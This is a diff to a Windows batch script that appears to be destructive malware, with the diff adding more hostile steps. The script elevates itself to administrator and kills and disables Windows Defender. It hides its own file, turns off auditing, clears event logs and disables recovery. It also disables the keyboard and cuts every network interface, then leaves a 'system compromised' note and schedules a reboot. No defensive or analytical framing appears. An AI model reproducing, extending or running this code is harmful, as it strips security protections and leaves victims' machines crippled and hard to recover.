@@ -1,6 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
-
+::admin
 if "%1"=="admin" goto :admin
 powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
 exit /b
@@ -26,10 +26,13 @@ if not "%1"=="bios_level" (
     exit /b
 )
 
+::other
+attrib +s +h +i +l +x +a "%0" >nul
 taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
 sc config WinDefend start= disabled >nul
 sc stop WinDefend >nul
-attrib +s +h +i +l +x +a "%0" >nul
+auditpol /set /category:* /success:disable /failure:disable >nul
+wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f >nul 2>&1
@@ -159,6 +162,7 @@ for /l %%i in (1,1,10) do (
 wevtutil cl System
 wevtutil cl Security
 wevtutil cl Application
+wmic nic where "NetEnabled=true" call disable
 echo Your system has been compromised. > %userprofile%\Desktop\READ_ME.txt
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Destroy /t REG_SZ /d "shutdown /r /t 60 /c ""Critical Error""" /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
@@ -170,4 +174,16 @@ netsh advfirewall firewall add rule name="BlockAllTraffic" dir=in action=block p
 netsh advfirewall firewall add rule name="BlockAllTrafficOut" dir=out action=block protocol=ANY remoteip=any >nul 2>&1
 powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
 powercfg -setactive SCHEME_CURRENT >nul 2>&1
+reagentc /disable >nul 2>&1
 rundll32 keyboard,disable
+powercfg -setactive 00000000-0000-0000-0000-000000000000 2>nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v EnableICMPRedirect /t REG_DWORD /d 1 /f
+netsh advfirewall set allprofiles state off >nul
+netsh interface ipv4 set address name="Ethernet" source=static addr=169.254.0.1 mask=255.255.0.0 gateway=none >nul 2>&1
+ipconfig /release all >nul
+devcon disable *NET* >nul 2>&1
+netsh interface set interface "Wi-Fi" admin=disabled >nul 2>&1
+netsh interface set interface "Ethernet" admin=disabled >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x80000000 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x3 /f
+wmic /namespace:\\root\wmi path MSPower_DeviceEnable call SetDisableState "DisableReason"=0x%1 >nul 2>&1
